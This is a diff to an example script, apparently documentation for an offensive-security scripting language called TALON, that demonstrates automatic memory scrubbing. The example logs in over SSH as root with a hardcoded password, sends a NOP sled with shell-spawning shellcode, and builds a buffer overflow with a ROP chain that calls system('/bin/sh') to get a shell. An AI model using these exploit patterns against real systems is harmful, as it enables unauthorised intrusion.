@@ -19,7 +19,7 @@ let port = 22
 
 # Connect to SSH (password is stored in SecureString internally)
 # Memory is automatically zeroed after authentication
-let ssh = connect_ssh(target, "root", "SecretPassword123")
+let ssh = connect_ssh(target, port, "root", "SecretPassword123")
 
 # Example 2: Automatic payload scrubbing
 # When you send an exploit payload, TALON automatically:
@@ -30,8 +30,9 @@ let ssh = connect_ssh(target, "root", "SecretPassword123")
 let conn = connect(target, 4444)
 
 # This payload will be automatically scrubbed from memory after sending
-let payload = b"\x90\x90\x90\x90"  # NOP sled
-payload += shellcode("sh")  # Add shellcode
+let nop_sled = "\x90\x90\x90\x90"  # NOP sled (will be converted to bytes internally)
+let sc = shellcode("sh")  # Add shellcode
+let payload = nop_sled + sc
 
 send(conn, payload)  # Payload is automatically zeroed in memory after this
 
@@ -93,14 +94,14 @@ rop.add_gadget(0x601234)  # address of "/bin/sh"
 rop.add_gadget(0x400567)  # system()
 
 # Build payload (will be scrubbed after sending)
-let overflow = b"A" * 128  # Buffer overflow
-overflow += p64(rop)  # ROP chain
+let overflow = "A" * 128  # Buffer overflow
+let payload_final = overflow + p64(rop)  # ROP chain
 
 # Send payload - automatically scrubbed from memory after this line
-sendline(conn, overflow)
+sendline(conn, payload_final)
 
 # Receive shell
-let response = recvuntil(conn, b"$ ")
+let response = recvline(conn)  # Receive until newline
 print("Got shell!")
 
 # Close connection
